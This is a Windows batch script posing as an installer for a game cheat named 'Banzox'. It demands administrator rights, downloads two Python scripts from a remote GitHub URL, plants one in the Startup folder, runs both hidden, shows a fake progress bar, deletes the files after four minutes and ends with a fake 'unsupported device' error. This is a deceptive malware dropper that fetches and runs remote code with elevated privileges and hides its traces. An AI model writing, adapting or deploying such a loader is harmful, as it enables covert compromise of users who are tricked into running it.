@echo off
title Banzox Installer

:: --- ROOT CHECK ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Banzox cheat can't work without access.
    echo Please right-click the file and press "Run as administrator".
    pause >nul
    exit /b 1
)

:: --- ADMIN MODE: PROCEED ---
echo [OK] Administrator privileges confirmed.
echo.

:: --- CREATE RANDOM TEMP FOLDER ---
set "RAND_DIR=%temp%\banzox_%random%"
mkdir "%RAND_DIR%" 2>nul
cd /d "%RAND_DIR%"

:: --- DOWNLOAD FILES ---
echo [1/5] Downloading core files...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/banzox.py' -OutFile 'banzox.py'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/checker.py' -OutFile 'checker.py'"

:: --- PLACE CHECKER IN STARTUP ---
echo [2/5] Placing checker in startup...
copy "checker.py" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\checker.py" >nul

:: --- RUN BOTH AS ADMIN (hidden) ---
echo [3/5] Launching components...
start "" pythonw "banzox.py"
start "" pythonw "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\checker.py"

:: --- LOADING BAR (4 minutes) ---
echo [4/5] The cheat is installing now — this will take a while.
echo Do NOT turn off your PC during installation.
echo.
echo Installing: 
for /l %%i in (1,1,20) do (
    ping -n 12 127.0.0.1 >nul
    set /p "=█" <nul
)
echo.
echo Installation complete.

:: --- WAIT EXACTLY 4 MINUTES ---
timeout /t 240 /nobreak >nul

:: --- DELETE FILES (checker first, then banzox) ---
echo [5/5] Cleaning up...
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\checker.py" 2>nul
del "banzox.py" 2>nul
rd "%RAND_DIR%" 2>nul

:: --- FINAL ERROR MESSAGE ---
echo.
echo ERROR: the cheat didn't support your device
pause
exit /b 0
